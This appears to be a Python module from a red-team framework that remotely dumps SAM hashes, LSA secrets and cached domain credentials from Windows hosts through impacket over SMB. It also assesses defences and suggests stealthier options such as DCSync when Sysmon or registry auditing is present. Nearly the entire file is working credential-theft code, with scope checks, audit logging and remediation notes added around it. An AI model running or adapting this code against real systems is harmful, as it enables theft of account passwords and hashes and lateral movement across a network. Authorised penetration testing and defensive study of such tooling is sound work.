"""
LSA Secrets & SAM Database Dump
MITRE: T1003.002 (SAM), T1003.004 (LSA Secrets)

Uses impacket secretsdump (DRSR-based) to extract:
  - SAM local account hashes
  - LSA secrets (service account cleartext passwords, machine account passwords)
  - Cached domain credentials (DCC2 hashes)

Requires: local admin credentials on target.
HIGH_NOISE: Windows Event ID 4648 (explicit credential logon) + registry access.
"""
from __future__ import annotations

import asyncio
import re
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.modules.params import LSASecretsParams
from ares.core.tracing import trace_module
from ares.sdk import (
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    ProcessPermission,
    module_contract,
)

logger = get_logger("ares.modules.windows.lsa_secrets")


@module_contract(
    permissions=[
        NetworkPermission(ports=[135, 445], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=LSASecretsParams,
)
class LSASecretsModule(BaseModule):
    """
    windows.lsa_secrets — "Extract local account hashes (SAM

    OPSEC: HIGH_NOISE
    MITRE: "T1003.002", "T1003.004"
    REQUIRES: "local_admin_creds"
    OUTPUTS:  "ntlm_hashes", "lsa_secrets", "cached_credentials"
    """
    MODULE_ID          = "windows.lsa_secrets"
    MODULE_NAME        = "LSA Secrets & SAM Dump"
    MODULE_CATEGORY    = "windows"
    MODULE_DESCRIPTION = (
        "Extract local account hashes (SAM) and LSA secrets via impacket secretsdump — "
        "recovers service account cleartext passwords stored in LSA"
    )
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    REQUIRES           = ["local_admin_creds"]
    OUTPUTS            = ["ntlm_hashes", "lsa_secrets", "cached_credentials"]
    MITRE_TECHNIQUES   = ["T1003.002", "T1003.004"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MIN_NOISE_PROFILE  = "normal"   # blocked in stealth
    PARAMS_MODEL       = LSASecretsParams

    async def assess_feasibility(self, ctx: "Any") -> "FeasibilityReport":
        """
        Pre-flight Defense Feasibility Assessment:
        Evaluates registry auditing, local admin access, noise constraints,
        and recommends ad.dcsync if target is a DC, or windows.dpapi if in stealth.
        """
        from ares.modules.base import FeasibilityReport
        from ares.core.campaign import NoiseProfile

        blockers: list[str] = []
        recommendations: list[str] = []
        opsec_tuning: dict[str, Any] = {}
        score = 1.0
        risk = "high_noise"

        target = sanitize_hostname(getattr(ctx, "target", "") or getattr(ctx, "params", {}).get("target", ""))
        if not target:
            blockers.append("No target host specified")
            score -= 0.5

        username = getattr(ctx, "params", {}).get("username", "")
        if not username:
            cred = getattr(ctx, "best_credential", lambda: None)()
            if cred:
                username = cred.username
        if not username:
            blockers.append("No administrator credentials provided")
            score -= 0.4

        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            blockers.append("Blocked in STEALTH profile: remote registry SAM/LSA hive dumping generates Sysmon Event 12/13 alerts")
            score = 0.1
            risk = "critical_alarm"
            recommendations.extend(["windows.dpapi", "ad.dcsync"])

        session = getattr(ctx, "session", None)
        if session and hasattr(session, "get_host") and target:
            host_state = session.get_host(target)
            if host_state:
                if host_state.has_defense("registry_auditing") or host_state.has_defense("sysmon_id12"):
                    risk = "critical_alarm"
                    score -= 0.3
                    recommendations.append("windows.dpapi")
                is_dc = (
                    getattr(host_state, "is_dc", False)
                    or getattr(host_state, "domain_role", "") == "domain_controller"
                    or (hasattr(host_state, "roles") and "dc" in getattr(host_state, "roles", []))
                )
                if is_dc:
                    recommendations.insert(0, "ad.dcsync")
                    opsec_tuning["dc_recommendation"] = "Target is a Domain Controller: ad.dcsync or NTDS extraction is more comprehensive than local LSA secrets."

        unique_recs: list[str] = []
        for r in recommendations:
            if r not in unique_recs:
                unique_recs.append(r)

        feasible = len(blockers) == 0 and score >= 0.4
        return FeasibilityReport(
            feasible=feasible,
            score=max(0.0, min(1.0, score)),
            risk_level=risk,
            blockers=blockers,
            recommended_alternatives=unique_recs,
            opsec_tuning=opsec_tuning,
            details={"target": target, "username": username},
        )

    async def validate(self, ctx: "Any") -> None:
        """LSA secrets dump blocked in STEALTH — registry access triggers Sysmon."""
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        from ares.core.campaign import NoiseProfile
        if not isinstance(ctx, ExecutionContext):
            return
        if isinstance(ctx.params, dict):
            if not ctx.params.get("target") and getattr(ctx, "target", None):
                ctx.params["target"] = ctx.target
            if not ctx.params.get("domain") and getattr(ctx, "domain", None):
                ctx.params["domain"] = ctx.domain
            if not ctx.params.get("username") and hasattr(ctx, "best_credential"):
                cred = ctx.best_credential()
                if cred and cred.username:
                    ctx.params["username"] = cred.username
        target = getattr(ctx, "target", "") or (ctx.params.get("target", "") if isinstance(ctx.params, dict) else getattr(ctx.params, "target", ""))
        if not target:
            raise ModuleValidationError(
                "windows.lsa_secrets requires 'target' — IP of target Windows host.",
                module_id=self.MODULE_ID, field="target",
            )
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "windows.lsa_secrets is blocked in STEALTH profile — "
                "registry hive access triggers Sysmon Event ID 12/13 and EDR alerts. "
                "Use NORMAL or AGGRESSIVE profile.",
                module_id=self.MODULE_ID, field="noise_profile",
            )
        await super().validate(ctx)

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})
        target   = getattr(ctx, "target", "")
        username = ""
        password = ""
        domain   = getattr(ctx, "domain", "")
        extra_params: dict[str, Any] = {}

        params = getattr(ctx, "params", {})
        if isinstance(params, LSASecretsParams):
            target = params.target or target
            username = params.username or ""
            password = params.password.get_secret_value() if hasattr(params.password, "get_secret_value") else (params.password or "")
            domain = params.domain or domain
        elif isinstance(params, dict):
            target = params.get("target") or target
            username = params.get("username", "")
            raw_pass = params.get("password") or params.get("secret", "")
            password = raw_pass.get_secret_value() if hasattr(raw_pass, "get_secret_value") else (raw_pass or "")
            domain = params.get("domain") or domain
            extra_params = {k: v for k, v in params.items() if k not in ("target", "username", "password", "secret", "domain")}

        findings, raw = await self.run(
            target=target, username=username, password=password, domain=domain, **extra_params
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for finding in findings:
            ev = EvidenceRecord(
                artifact_id=f"windows-lsa-{target.replace('.', '-')}",
                source_target=target,
                collected_by=self.MODULE_ID,
                data={
                    "target": target,
                    "title": finding.title,
                    "severity": str(finding.severity),
                },
                tags=["windows", "lsa_secrets"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("windows.lsa_secrets")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target   = kwargs.get("target", "")
        username = kwargs.get("username", "")
        password = kwargs.get("password", "") or kwargs.get("secret", "")
        domain   = kwargs.get("domain", "")
        dry_run  = kwargs.get("dry_run", False)

        target = sanitize_hostname(target)   # lsa_secrets was missing this — ISU fix

        if not target or not username:
            return [], {"error": "target and username required"}
        if dry_run:
            return [], {"dry_run": True}

        await self.before_request(target, "smb")  # scope check + jitter

        try:
            from impacket.examples.secretsdump import (  # type: ignore[import]
                RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
            )
            from impacket.smbconnection import SMBConnection  # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket not installed — pip install ares-redteam[ad]"}

        logger.info("lsa_secrets_start", target=target, username=username)
        audit("lsa_secrets", actor=username, source="operator",
              target=target, technique="T1003.002")
        await self.noise.rate_limiter.acquire("smb")
        await self.noise.jitter.sleep()

        sam_hashes:  list[str] = []
        lsa_secrets_out: list[str] = []
        cached_creds: list[str] = []
        errors: list[str] = []

        loop = asyncio.get_running_loop()

        def _dump() -> dict[str, list[str]]:
            results: dict[str, list[str]] = {
                "sam": [], "lsa": [], "cached": [], "errors": []
            }
            smb = None
            remote_ops = None
            try:
                smb = SMBConnection(target, target, timeout=15)
                smb.login(username, password, domain)

                remote_ops = RemoteOperations(smb, False)
                remote_ops.enableRegistry()

                # SAM hashes
                try:
                    sam_file    = remote_ops.saveSAM()
                    boot_key    = remote_ops.getBootKey()
                    sam_handler = SAMHashes(sam_file, boot_key, isRemote=True)
                    sam_handler.dump()
                    for entry in sam_handler.getHashes():
                        results["sam"].append(str(entry))
                    sam_handler.finish()
                except Exception as e:
                    results["errors"].append(f"SAM: {e!s:.80}")

                # LSA secrets
                try:
                    security_file = remote_ops.saveSECURITY()
                    lsa_handler   = LSASecrets(security_file, boot_key,
                                               remote_ops, isRemote=True)
                    lsa_handler.dumpCachedHashes()
                    for entry in lsa_handler.getSecrets():
                        results["lsa"].append(str(entry))
                    for entry in lsa_handler.getCachedCredentials():
                        results["cached"].append(str(entry))
                    lsa_handler.finish()
                except Exception as e:
                    results["errors"].append(f"LSA: {e!s:.80}")

            except Exception as e:
                results["errors"].append(str(e)[:200])
            finally:
                if remote_ops:
                    try: remote_ops.finish()
                    except Exception: pass
                if smb:
                    try: smb.logoff()
                    except Exception: pass
            return results

        result = await loop.run_in_executor(None, _dump)
        sam_hashes       = result["sam"]
        lsa_secrets_out  = result["lsa"]
        cached_creds     = result["cached"]
        errors           = result["errors"]

        if sam_hashes:
            self.finding(
                title=f"SAM Database Dumped — {len(sam_hashes)} Local Account Hash(es) from {target}",
                description=(
                    f"Successfully dumped SAM database from {target} with {len(sam_hashes)} "
                    "local account NTLM hash(es). These can be used for Pass-the-Hash attacks "
                    "or cracked offline with hashcat (mode 1000)."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1003.002",
                mitre_tactic="Credential Access",
                evidence={"target": target, "hash_count": len(sam_hashes),
                           "hashes": sam_hashes},
                remediation=(
                    "Enable Windows Credential Guard to protect credential material. "
                    "Rotate all local administrator passwords immediately. "
                    "Use LAPS for unique local admin passwords across hosts. "
                    "Enable Protected Users security group for all privileged accounts."
                ),
                host=target, confidence=1.0,
            )

        if lsa_secrets_out:
            # Check for cleartext passwords in LSA secrets
            cleartext_count = sum(
                1 for s in lsa_secrets_out
                if re.search(r'\$MACHINE\.ACC|_SC_|DPAPI|NL\$KM', s)
            )
            self.finding(
                title=f"LSA Secrets Extracted — {len(lsa_secrets_out)} Secret(s) from {target}",
                description=(
                    f"LSA secrets extracted from {target}. "
                    "LSA secrets can contain service account cleartext passwords, "
                    "machine account password hashes, and DPAPI master keys."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1003.004",
                mitre_tactic="Credential Access",
                evidence={"target": target, "secret_count": len(lsa_secrets_out),
                           "cleartext_indicators": cleartext_count},
                remediation=(
                    "Rotate all service account passwords. "
                    "Audit which services run as domain accounts. "
                    "Enable Windows Credential Guard."
                ),
                host=target, confidence=1.0,
            )

        if cached_creds:
            self.finding(
                title=f"Cached Domain Credentials (DCC2) Found on {target}",
                description=(
                    f"{len(cached_creds)} cached domain credential hash(es) found on {target}. "
                    "DCC2 hashes can be cracked offline (hashcat mode 2100) to recover "
                    "domain user cleartext passwords."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1003.005",
                mitre_tactic="Credential Access",
                evidence={"target": target, "count": len(cached_creds),
                           "hashes": cached_creds},
                remediation=(
                    "Set CachedLogonsCount registry value to 0 to disable credential caching "
                    "on non-laptop machines. Use SCCM/Intune offline domain join instead."
                ),
                host=target, confidence=1.0,
            )

        raw = {
            "target": target, "sam_hashes": sam_hashes,
            "lsa_secrets": lsa_secrets_out,
            "cached_credentials": cached_creds,
            "errors": errors,
        }
        raw["ntlm_hashes"] = raw.get("sam_hashes", [])  # OUTPUTS key
        return self._findings[:], raw
